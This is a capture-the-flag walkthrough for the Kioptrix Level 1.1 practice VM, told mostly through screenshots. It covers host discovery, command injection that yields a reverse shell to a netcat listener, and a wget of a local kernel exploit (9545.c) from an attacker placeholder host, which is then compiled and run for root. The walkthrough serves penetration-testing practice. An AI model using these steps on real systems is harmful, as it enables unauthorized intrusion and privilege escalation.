...
![Kioptrix Level 1.1 netdiscover](/images/KioptrixLevel21.png)

Next, I ran `threader3000` and let it run it's suggested nmap scan to enumerate the open ports.

![Kioptrix Level 1.1 threader3000](/images/KioptrixLevel22.png)

![Kioptrix Level 1.1 nmap](/images/KioptrixLevel23.png)
...
![Kioptrix Level 1.1 website](/images/KioptrixLevel24.png)
...
![Kioptrix Level 1.1 Basic Admin Console](/images/KioptrixLevel25.png)
...
![Kioptrix Level 1.1 command injection](/images/KioptrixLevel26.png)

Open up a new terminal window from your attacker pc and run `nc -nvlp 4444` to start a listener on port 4444.

![Kioptrix Level 1.1 nc listener](/images/KioptrixLevel27.png)
...
![Kioptrix Level 1.1 command injection reverse shell](/images/KioptrixLevel28.png)

Once submitted, look at your terminal with the netcat listener, you should have a reverse bash shell.

![Kioptrix Level 1.1 reverse shell](/images/KioptrixLevel29.png)
...
![Kioptrix Level 1.1 whoami uname -a](/images/KioptrixLevel210.png)
...
![Kioptrix searchsploit Linux Kernel](/images/KioptrixLevel211.png)
...
![Kioptrix Level 1.1 searchsploit copy python http server](/images/KioptrixLevel212.png)

From your apache shell on the victim computer, run `cd /tmp` followed by `wget http://[attacker ip]:8000/9545.c`

![Kioptrix Level 1.1 wget copy exploit](/images/KioptrixLevel213.png)

Next, run `cat 9545.c` and look at the comments, you will see a section on how to compile this exploit.

![Kioptrix Level 1.1 cat exploit](/images/KioptrixLevel214.png)
...
![Kioptrix Level 1.1 compile exploit](/images/KioptrixLevel215.png)

As you can see, this compiled as **9545** and is executable. run `./9545` and you should end up with a root shell!

![Kioptrix Level 1.1 root shell](/images/KioptrixLevel216.png)
